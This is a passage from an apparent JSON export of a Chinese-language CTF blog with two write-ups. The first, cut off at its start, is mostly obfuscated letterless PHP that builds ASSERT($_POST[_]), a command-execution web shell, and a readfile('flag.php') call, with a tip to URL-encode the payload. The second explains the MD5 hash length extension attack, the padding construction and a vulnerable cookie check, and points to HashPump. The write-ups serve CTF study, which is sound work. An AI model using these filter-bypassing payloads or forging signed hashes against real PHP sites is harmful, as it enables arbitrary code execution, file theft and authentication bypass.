$__=$_; //$__=&#39;A&#39; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;S&#39; $____.=$__; //$____=&#39;_POS&#39; $__=$_; //$__=&#39;A&#39; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;T&#39; $____.=$__; ////$____=&#39;_POST&#39; $_=$$____; //$_=&#39;$_POST&#39; $___($_[_]); // ASSERT($_POST[_]); ?&gt;再构造readfile(‘flag.php’) &lt;?=$_=[];$_=&quot;$_&quot;;$_=$_[(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$_;$___++;$___++;$___++;$___++;$____=$_;$_____=$_;$_____++;$_____++;$_____++;$______=$_;$______++;$______++;$______++;$______++;$______++;$__=$__.$___.$____.$_____.$______;$___=$_;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$__=$__.$___.$____.$_____;$___=$_;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$______=$_;$______++;$______++;$______++;$______++;$______++;$______++;$___=$___.$____.$_____.$______;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$___=$___.&#39;.&#39;.$____.$_____.$____;$__($___);?&gt;然后记得url编码过去 + 在匹配中会认为是空格 然后包含 再补充下为什么文件后缀不是 php 可以执行 php代码 只要文件内容是php完整代码就能执行","permalink":"http://perthinking.xyz/CTF/2/","photos":[]},{"tags":[],"title":"哈希长度扩展攻击","date":"2020/04/19","text":"攻击的常见来源:大多数网站有下载文件的选项,它会判断你是否具有权限下载这个文件,就会对你想要下载的任意文件名进行类似于MD5,Sha等算法的hash,例如你想要下载hash=test.pdf%00../../../etc/password它就可能执行判断语句:if ($sig === md5($salt.$name))但是这样的话就有可能被绕过的风险 MD5算法解析:Md5的典型应用是对一段字符串产生指纹,防止被篡改.就相当于每个人都有自己独立的指纹(在算法里面是可以绕过的)MD5以多个512位(64个字节)分组来处理文本,每组16个32位(4个字节)子分组.算法输出由32位分组组成.当每一个块(512位分组)计算完成后,四个寄存器的值就被更新,如果还存在下一个块,就会在被更新的寄存器上继续计算,直到所有块被计算完毕,四个寄存器的十六进制值连接起来就是MD5当被hash的字符串长度不足512bit时,就得部位 部位(补bit和补长度)判断len(str) % 512 = 448 ,如果不是的话,就对它进行部位,例如test为四个字节,要让条件成立的话,就必须补(448-4*8)个bit,首先补一个二进制位上的一个1,接着在后面补0.然后补剩下的64bit的长度,这个长度就是字符串的长度,如果超出64位,就取低64位例如补完一个块可能是这样的: Str + &#39;\\x80&#39; + &#39;\\x00&#39;*n + &#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#39; 其中算法的补位这部分,就是实现长度扩展攻击的关键,所以部位肯定是可控的 攻击原理:构造部位: 假如有一个下载文件的题目,已知字符串 ‘secret+test.pdf’的hash值,secret的长度为10,要求你下载这个网站的其它文件 实现攻击的第一步,将secret+test.pdf补足到64字节 Len(secret) + len(&quot;test.pdf&quot;) + len(padding) + 8 = 64 可以计算出padding的长度为64-8-10-8=38 先补一个二进制位上的1即”\\x80” 和37个0即”\\x00”37,于是变成了这样: Secret + &quot;test.pdf&quot; + &quot;\\x80&quot; + &quot;\\x00&quot;*37 + 8 再补后面的8个字节,这8个字节的内容是len(secret+test.pdf)即18(144位),换算成16进制就是\\x90 + 7个二进制位上的0 所以变成: Secret + &quot;test.pdf&quot; + &quot;\\x80&quot; + &quot;\\x00&quot;*37 + &quot;\\x90\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; ​ 构造hash:用工具爆破即可 所以:构造补位就是为了不用计算第一块的值,只需要计算第二块或者第二块以后的值,而初始值就是原来的hash(这个知道就行了),然后用构造的字符串计算出新的hash 题目主要源码: if (!empty($_COOKIE[&quot;getmein&quot;])) { if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) { if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { echo &quot;Congratulations! You are a registered user.\\n&quot;; die (&quot;The flag is &quot;. $flag); } else { die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;); } } else { die (&quot;You are not an admin! LEAVE.&quot;); } }绕过条件:username=admin password!=admin $COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))用脚本爆破是不可能的,因为我尝试过了所以用到了hash长度扩展攻击,条件符合直接上HashPump脚本","permalink":"http://perthinking.xyz/CTF/1/","photos":[]}],"categories":[],"tags":[]}